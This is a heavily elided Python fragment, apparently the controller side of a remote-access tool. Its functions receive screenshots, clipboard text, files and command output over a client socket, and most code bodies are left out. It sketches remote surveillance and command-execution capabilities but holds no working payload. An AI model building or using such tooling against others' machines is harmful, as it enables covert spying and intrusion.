...
def snapshot(client_socket):
    try:
        ...
        img_content = recv_content(client_socket)[4:]
...
def clipboard(client_socket):
    try:
        ...
        txt_content = recv_content(client_socket)[4:]
...
def get_file(client_socket, filepath):
    try:
        ...
        content = recv_content(client_socket)[4:]
...
def execute_cmd(client_socket, cmd):
    try:
        ...
        content = recv_content(client_socket)
        print("cmd rtn:"+content.decode('utf-8'))
    except:
        traceback.print_exc()
        exit()
